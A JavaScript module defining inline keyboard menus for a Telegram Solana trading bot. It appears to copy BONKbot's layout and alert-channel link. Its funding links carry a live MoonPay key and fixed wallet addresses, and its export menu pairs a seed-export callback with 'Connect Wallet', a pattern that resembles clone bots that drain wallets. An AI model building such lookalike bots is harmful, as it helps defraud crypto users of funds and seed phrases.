const startMenu = {
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'I Have Read And Accept the Terms of Use', callback_data: 'register' }
            ]
        ]
    }
};
const agreementMenu = {
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'Buy', callback_data: 'buy' },
                { text: 'Fund', url: 'https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D' }
            ],
            [
                { text: 'Help', callback_data: 'help' },
                { text: 'Refer Friends', callback_data: 'refer' },
                { text: 'Alerts', url: 'https://t.me/BONKbotNewTokenAlerts' }
            ],
            [
                { text: 'Wallet', callback_data: 'wallet' },
                { text: 'Settings', callback_data: 'settings' }
            ],
            [
                { text: 'DCA Orders', callback_data: 'dca_orders' },
                { text: 'Limit Orders', callback_data: 'limit_orders' }
            ],
            [
                { text: '🔒 [ nighthawk ]', callback_data: 'nighthawk' },
                { text: 'Refresh', callback_data: 'refresh' }
            ]
        ]
    }
};
const walletMenu = {
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'View on Solscan', url: 'https://solscan.io/account/4k5EaQx7hbzQLfvjhRRTm9CnemhmRbHBW5AKBZhENGBq' },
                { text: 'Close', callback_data: 'close' }
            ],
            [
                { text: 'Deposit SOL', callback_data: 'deposit' },
                { text: 'Buy SOL', url: 'https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=4k5EaQx7hbzQLfvjhRRTm9CnemhmRbHBW5AKBZhENGBq&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D' }
            ],
            [
                { text: 'Withdraw all SOL', callback_data: 'withdraw_all' },
                { text: 'Withdraw X SOL', callback_data: 'withdraw_custom' }
            ],
            [
                { text: 'Reset Wallet', callback_data: 'reset_wallet' },
                { text: 'Export Wallet', callback_data: 'export_wallet' }
            ],
            [
                { text: 'Manage Tokens', callback_data: 'manage_tokens' }
            ],
            [
                { text: 'Refresh', callback_data: 'refresh' }
            ]
        ]
    }
};
const exportMenu = {
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'To Proceed 🕹️', callback_data: 'export_seed' },
                { text: 'Connect Wallet 🔗', callback_data: 'connect_wallet' }
            ],
            [{ text: 'Use bot wallet 🤖', callback_data: 'deposit' }]
        ]
    }
};
const adminMenu = {
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'Get User List', callback_data: 'adminGetUsers' },
                { text: 'Get Admin List', callback_data: 'adminGetAdmins' }
            ],
            [
                { text: 'Help', callback_data: 'adminHelp' },
                { text: 'Admin Logout', callback_data: 'adminLogout' }
            ],
        ]
    }
};
export { startMenu, agreementMenu, walletMenu, exportMenu, adminMenu };
// This module defines the inline keyboard menus for the Telegram bot.